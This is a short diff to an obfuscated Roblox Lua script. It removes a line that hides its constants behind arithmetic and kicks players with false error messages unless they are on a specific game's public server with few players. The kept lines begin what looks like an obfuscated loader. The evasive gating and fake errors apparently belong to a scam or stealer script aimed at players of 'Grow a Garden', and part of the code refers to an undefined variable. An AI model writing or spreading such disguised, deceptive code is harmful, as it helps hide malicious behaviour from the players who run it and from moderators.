@@ -1,4 +1,3 @@
-_G.scriptExecuted=_G.scriptExecuted or false ;if _G.scriptExecuted then return;end _G.scriptExecuted=true;local v0=game:GetService("Players");if (game.PlaceId~=(126885386261761 -690627695)) then local v1=927 -(214 + 713) ;while true do if (v1==0) then plr:kick("Game not supported. Please join a normal GAG server");return;end end end if ( #v0:GetPlayers()>=(1355 -(993 + 357))) then plr:kick("Server error. Please join a DIFFERENT server");return;end if (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()=="VIPServer") then local v2=619 -(555 + 64) ;while true do if (v2==(931 -(857 + 74))) then plr:kick("Server error. Please join a DIFFERENT server");return;end end end
 local StrToNumber = tonumber;
 local Byte = string.byte;
 local Char = string.char;
